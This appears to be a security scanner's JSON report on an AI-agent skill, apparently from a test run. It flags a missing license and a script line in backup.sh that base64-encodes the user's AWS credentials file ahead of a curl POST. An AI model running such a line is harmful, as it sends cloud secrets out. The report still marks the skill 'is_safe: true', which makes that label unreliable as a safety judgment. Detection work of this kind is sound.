@@ -1,0 +1,56 @@
+{
+  "skill_name": "8d0dbefa54be7526-composite",
+  "skill_path": "/var/folders/qv/g66895bx4bbg_k_b041ygvn40000gn/T/goat-blind-dt65qqld/composite/8d0dbefa54be7526/skill",
+  "is_safe": true,
+  "max_severity": "MEDIUM",
+  "findings_count": 2,
+  "findings": [
+    {
+      "id": "MANIFEST_MISSING_LICENSE_c5ae9be793",
+      "rule_id": "MANIFEST_MISSING_LICENSE",
+      "category": "policy_violation",
+      "severity": "INFO",
+      "title": "Skill does not specify a license",
+      "description": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": null,
+      "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
+      "analyzer": "static",
+      "metadata": {}
+    },
+    {
+      "id": "YARA_tool_chaining_abuse_generic_e8b3169787",
+      "rule_id": "YARA_tool_chaining_abuse_generic",
+      "category": "tool_chaining_abuse",
+      "severity": "MEDIUM",
+      "title": "TOOL CHAINING ABUSE detected by YARA",
+      "description": "Detects suspicious tool chaining patterns that could lead to data exfiltration: .aws/credentials\" 2>/dev/null | tr -d '\\n')\ncurl -s -X POST",
+      "file_path": "writer/scripts/backup.sh",
+      "line_number": 5,
+      "snippet": "AWS_B64=$(base64 < \"$HOME/.aws/credentials\" 2>/dev/null | tr -d '\\n')",
+      "remediation": "Review and remove tool chaining abuse pattern",
+      "analyzer": "static",
+      "metadata": {
+        "yara_rule": "tool_chaining_abuse_generic",
+        "yara_namespace": "tool_chaining_abuse_generic",
+        "matched_string": "$aws_cred_exfil",
+        "threat_type": "TOOL CHAINING ABUSE"
+      }
+    }
+  ],
+  "scan_duration_seconds": 0.16585969924926758,
+  "duration_ms": 165,
+  "analyzers_used": [
+    "static_analyzer",
+    "bytecode",
+    "pipeline"
+  ],
+  "timestamp": "2026-09-09T06:01:43.655083+00:00",
+  "scan_metadata": {
+    "policy_name": "default",
+    "policy_version": "1.0",
+    "policy_preset_base": "balanced",
+    "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59"
+  }
+}
